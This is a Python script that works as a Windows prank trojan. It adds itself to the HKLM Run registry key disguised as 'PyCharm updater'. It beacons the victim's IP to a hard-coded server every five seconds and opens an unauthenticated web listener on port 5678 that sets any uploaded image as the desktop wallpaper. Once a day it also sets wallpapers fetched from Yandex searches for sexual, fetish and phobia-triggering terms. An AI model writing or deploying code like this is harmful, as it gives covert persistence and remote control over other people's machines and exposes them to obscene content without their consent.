import ctypes
import json
import os
import random
import socket
import sys
from threading import Thread
from time import sleep
from urllib.parse import quote

import requests
import schedule as schedule
from bs4 import BeautifulSoup
from gevent.pywsgi import WSGIServer
from requests import Session
from werkzeug.utils import secure_filename

V_SERVER_IP = "172.17.207.112"

image_bot_path = os.path.join(os.environ["TEMP"], "bimage.jpg")


def change_background_image(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)


def search_and_get_new_image():
    words = [
        "мотылек",
        "страпон",
        "баннер виндоус",
        "bdsm",
        "черный властелин",
        "fetish",
        "gachimuchi",
        "Арсен шогенов",
        "трипофобия",
    ]

    text = quote(f"{random.choice(words)} 1920x1080")
    y_search = f"https://yandex.ru/images/search/?text={text}"

    session = Session()
    response = session.get(y_search)
    soup = BeautifulSoup(response.content, features="html.parser")

    data = json.loads(soup.find_all("div", {"class": "serp-item"})[random.randint(0, 50)]['data-bem'])["serp-item"]["preview"][0]
    image_path = os.path.join(os.environ["TEMP"], "image.jpg")

    with open(image_path, "wb") as f:
        f.write(session.get(data["url"]).content)

    session.close()
    return image_path


def search_and_set_new():
    p = search_and_get_new_image()
    change_background_image(p)


from flask import Flask, jsonify, request
app = Flask(__name__)


@app.route("/", methods=["GET"])
def index():
    return "qwerty", 200


@app.route("/image", methods=["POST"])
def link():
    if request.method == 'POST':
        image = request.files['media']
        secure_filename(image.filename)
        image.save(image_bot_path)
        if os.path.isfile(image_bot_path):
            change_background_image(image_bot_path)
            sleep(5)
            os.remove(image_bot_path)
        return jsonify(dict(status="OK")), 201
    # with open(image_path, "wb") as f:
    #     f.write(image)


def start_server(app_, port):
    srv = WSGIServer(('0.0.0.0', port), app_, log=None)
    # srv = WSGIServer(('172.17.207.112', port), app_, log=None)
    srv.serve_forever()


def ping_v():
    url = f'http://{V_SERVER_IP}:8765/online'
    data = {'ip': socket.gethostbyname(socket.gethostname())}
    try:
        res = requests.post(url, json=data)
    except Exception as e:
        return f"Error {e}"
    else:
        return res


if __name__ == '__main__':
    from winreg import *
    t = Thread(target=start_server)
    key_my = OpenKey(HKEY_LOCAL_MACHINE,
                     r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                     0, KEY_ALL_ACCESS)
    SetValueEx(key_my, 'PyCharm updater', 0, REG_SZ, sys.argv[0].replace("/", "\\"))
    CloseKey(key_my)
    schedule.every(1).day.at("03:00").do(search_and_set_new)
    schedule.every(5).seconds.do(ping_v) #  set 5 sec

    t = Thread(target=start_server, args=(app, 5678))
    t.start()

    while True:
        try:
            schedule.run_pending()
        except Exception as ex:
            print(ex)
            raise
            sleep(3)
        sleep(0.3)
